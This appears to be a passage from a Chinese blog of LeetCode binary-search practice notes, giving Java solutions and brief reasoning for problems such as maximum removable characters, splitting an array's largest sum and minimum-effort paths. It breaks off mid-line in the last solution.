<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxNumOfMarkedIndices(int[] nums) &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        int count = 0;</span><br><span class="line">        int left = 0;</span><br><span class="line">        int n = nums.length;</span><br><span class="line">        int right = (n + 1) / 2;//细节点，因为配对的一定在两边</span><br><span class="line">        while (left &lt; (n + 1) / 2 &amp;&amp; right &lt; n) &#123;</span><br><span class="line">            if (nums[left] * 2 &lt;= nums[right]) &#123;</span><br><span class="line">                left++;</span><br><span class="line">                right++;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                right++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return count * 2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二分代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxNumOfMarkedIndices</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> nums.length / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (check(nums, mid)) &#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] * <span class="number">2</span> &gt; nums[n - k + i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1898-可移除字符的最大数目"><a href="#1898-可移除字符的最大数目" class="headerlink" title="1898. 可移除字符的最大数目"></a><a href="https://leetcode.cn/problems/maximum-number-of-removable-characters/">1898. 可移除字符的最大数目</a></h3><p>思考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目直接求k比较困难，但是给出k判断是否是子序列比较简单。能够二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumRemovals</span><span class="params">(String s, String p, <span class="type">int</span>[] removable)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> removable.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(s, p, removable, mid))&#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String s, String p, <span class="type">int</span>[] removable, <span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="type">boolean</span>[] isDeleted = <span class="keyword">new</span> <span class="title class_">boolean</span>[s.length()];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            isDeleted[removable[i]] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> p.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>,j = <span class="number">0</span>; i &lt; n; i++,j++) &#123;</span><br><span class="line">            <span class="keyword">while</span> ((j &lt; m) &amp;&amp; (isDeleted[j] || p.charAt(i) != s.charAt(j)))&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == m) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1802-有界数组中指定下标处的最大值"><a href="#1802-有界数组中指定下标处的最大值" class="headerlink" title="1802. 有界数组中指定下标处的最大值"></a><a href="https://leetcode.cn/problems/maximum-value-at-a-given-index-in-a-bounded-array/">1802. 有界数组中指定下标处的最大值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分假设最大值k即可。左右两边分别减少最后1、1即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxValue</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> index, <span class="type">int</span> maxSum)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e9</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(n, index, maxSum, mid))&#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> index, <span class="type">int</span> maxSum, <span class="type">int</span> maxVal)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> calc(index, maxVal);</span><br><span class="line">        <span class="comment">//0 1 2 .... index  n-1</span></span><br><span class="line">        sum += calc(n - <span class="number">1</span> - index, maxVal);</span><br><span class="line">        sum -= maxVal;</span><br><span class="line">        <span class="keyword">return</span> sum &lt;= maxSum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="title function_">calc</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> maxVal)</span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sumVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (maxVal &gt; index) &#123;</span><br><span class="line">            <span class="comment">// maxVal + ..... + (maxVal - index)</span></span><br><span class="line">            sumVal += (<span class="type">long</span>) (index + <span class="number">1</span>) * (maxVal + maxVal - index) / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sumVal += (<span class="type">long</span>) (maxVal) * (maxVal + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            sumVal += (index - maxVal + <span class="number">1</span>) ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sumVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1642-可以到达的最远建筑"><a href="#1642-可以到达的最远建筑" class="headerlink" title="1642. 可以到达的最远建筑"></a><a href="https://leetcode.cn/problems/furthest-building-you-can-reach/">1642. 可以到达的最远建筑</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当要上升时两种选择，一砖块、二梯子。如果范围小可以搜索，但是范围很大。</span><br><span class="line">我们可以假设能到某处，然后在根据实际情况求出能否到达（高度差最大的地方用梯子即可）。</span><br><span class="line">然后就可以二分了。</span><br><span class="line">但是这个check函数好像每次都要遍历一遍数组，并且需要使用某些数据结构维护差值。有两个想法一是自带顺序的TreeMap,二是使用list存，之后sort下。</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">furthestBuilding</span><span class="params">(<span class="type">int</span>[] heights, <span class="type">int</span> bricks, <span class="type">int</span> ladders)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> heights.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(heights, bricks, ladders, mid))&#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] heights, <span class="type">int</span> bricks, <span class="type">int</span> ladders, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; target; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (heights[i] &lt; heights[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                list.add(heights[i + <span class="number">1</span>] - heights[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        list.sort(Comparator.reverseOrder());</span><br><span class="line">        <span class="keyword">if</span>(list.size() &lt;= ladders) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ladders; i &lt; list.size(); i++) &#123;</span><br><span class="line">            sum += list.get(i);</span><br><span class="line">            <span class="keyword">if</span>(sum &gt; bricks) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo:之后学下贪心做法</p>
<h3 id="2861-最大合金数"><a href="#2861-最大合金数" class="headerlink" title="2861. 最大合金数"></a><a href="https://leetcode.cn/problems/maximum-number-of-alloys/">2861. 最大合金数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分，做烦了。直接cv了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 全部转成 int[] 数组，效率比 List&lt;Integer&gt; 更高</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxNumberOfAlloys</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> budget, List&lt;List&lt;Integer&gt;&gt; composition, List&lt;Integer&gt; Stock, List&lt;Integer&gt; Cost)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mx</span> <span class="operator">=</span> Collections.min(Stock) + budget;</span><br><span class="line">        <span class="type">int</span>[] stock = Stock.stream().mapToInt(i -&gt; i).toArray();</span><br><span class="line">        <span class="type">int</span>[] cost = Cost.stream().mapToInt(i -&gt; i).toArray();</span><br><span class="line">        <span class="keyword">for</span> (List&lt;Integer&gt; Comp : composition) &#123;</span><br><span class="line">            <span class="type">int</span>[] comp = Comp.stream().mapToInt(i -&gt; i).toArray();</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> ans, right = mx + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (left + <span class="number">1</span> &lt; right) &#123; <span class="comment">// 开区间写法</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">long</span> <span class="variable">money</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (stock[i] &lt; (<span class="type">long</span>) comp[i] * mid) &#123;</span><br><span class="line">                        money += ((<span class="type">long</span>) comp[i] * mid - stock[i]) * cost[i];</span><br><span class="line">                        <span class="keyword">if</span> (money &gt; budget) &#123;</span><br><span class="line">                            ok = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (ok) &#123;</span><br><span class="line">                    left = mid;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    right = mid;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="二分间接值"><a href="#二分间接值" class="headerlink" title="二分间接值"></a>二分间接值</h2><h3 id="3143-正方形中的最多点数"><a href="#3143-正方形中的最多点数" class="headerlink" title="3143. 正方形中的最多点数"></a><a href="https://leetcode.cn/problems/maximum-points-inside-the-square/">3143. 正方形中的最多点数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分法，检查函数使用set</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxPointsInsideSquare</span><span class="params">(<span class="type">int</span>[][] points, String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">1e9</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">checkNum</span> <span class="operator">=</span> check(points, s, mid);</span><br><span class="line">            <span class="keyword">if</span> (checkNum == -<span class="number">1</span>)&#123;</span><br><span class="line">                high = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                low = mid;</span><br><span class="line">                res = Integer.max(res, checkNum);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[][] points, String s, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; points.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Math.abs(points[i][<span class="number">0</span>]) &lt;= r &amp;&amp; Math.abs(points[i][<span class="number">1</span>]) &lt;= r) &#123;</span><br><span class="line">                <span class="keyword">if</span>(set.contains(s.charAt(i))) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                set.add(s.charAt(i));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> set.size();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>int low &#x3D; -1; 是因为结果可能是取0得时候获得但是left&lt;mid&lt;&#x3D;right</p>
<p>如果low&#x3D;0会导致mid一直都不会为0，可能会错过答案，为了避免特判，所以这样写</p>
<p>todo:之后学下题解方法二</p>
<h2 id="最小化最大值"><a href="#最小化最大值" class="headerlink" title="最小化最大值"></a>最小化最大值</h2><h3 id="410-分割数组的最大值"><a href="#410-分割数组的最大值" class="headerlink" title="410. 分割数组的最大值"></a><a href="https://leetcode.cn/problems/split-array-largest-sum/">410. 分割数组的最大值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉可以前缀和加二分 （写了后发现不用前缀和）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">splitArray</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line"><span class="comment">//        int[] preSum = new int[n + 1];</span></span><br><span class="line"><span class="comment">//        for (int i = 0; i &lt; nums.length; i++) &#123;</span></span><br><span class="line"><span class="comment">//            preSum[i + 1] = preSum[i] + nums[i];</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> Arrays.stream(nums).sum();</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> sum;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(nums, k, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; target) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (sum + nums[i] &lt;= target) sum += nums[i];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                sum = nums[i];</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &lt;= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2064-分配给商店的最多商品的最小值"><a href="#2064-分配给商店的最多商品的最小值" class="headerlink" title="2064. 分配给商店的最多商品的最小值"></a><a href="https://leetcode.cn/problems/minimized-maximum-of-products-distributed-to-any-store/">2064. 分配给商店的最多商品的最小值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimizedMaximum</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[] quantities)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> Arrays.stream(quantities).max().getAsInt();</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(n, quantities, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span>[] quantities, <span class="type">int</span> num)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; quantities.length; i++) &#123;</span><br><span class="line">            sum += (quantities[i] + num - <span class="number">1</span>) / num;</span><br><span class="line">            <span class="keyword">if</span>(sum &gt; n) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum &lt;= n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>EZ</p>
<h3 id="1760-袋子里最少数目的球"><a href="#1760-袋子里最少数目的球" class="headerlink" title="1760. 袋子里最少数目的球"></a><a href="https://leetcode.cn/problems/minimum-limit-of-balls-in-a-bag/">1760. 袋子里最少数目的球</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分。假设开销为k。</span><br><span class="line">那么只需遍历数组。对于某个数小于x不管，大于x则执行 (x -k + k -1 )/k次操作。</span><br><span class="line">而且显而易见开销越大我们需要的次数越少。</span><br><span class="line">所以直接二分即可</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumSize</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> maxOperations)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> Arrays.stream(nums).max().getAsInt();</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(nums, maxOperations, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> maxOperations, <span class="type">int</span> k)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">operations</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            operations += (num - <span class="number">1</span>) / k;</span><br><span class="line">            <span class="keyword">if</span>(operations &gt; maxOperations) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1631-最小体力消耗路径"><a href="#1631-最小体力消耗路径" class="headerlink" title="1631. 最小体力消耗路径"></a><a href="https://leetcode.cn/problems/path-with-minimum-effort/">1631. 最小体力消耗路径</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">粗看感觉像是图论题。但是能上下左右感觉不对劲了，再看范围1 &lt;= rows, columns &lt;= 100 其实还挺小的（或许能搜索+减枝解决，但复杂度应该也很大）。这个时候就二分了（因为在二分题单而且有最大值、最小值字眼）</span><br><span class="line">做法应该就是二分+bfs了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimumEffortPath</span><span class="params">(<span class="type">int</span>[][] heights)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> heights.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> heights[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            high = Integer.max(high, Arrays.stream(heights[i]).max().getAsInt());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(heights, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[][] heights, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> heights.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> heights[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        Deque&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.add(<span class="number">0</span>);</span><br><span class="line">        visited[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>( <span class="number">0</span> == m - <span class="number">1</span> &amp;&amp; <span class="number">0</span> == n - <span class="number">1</span>) <span class="keyword">return</span> <span 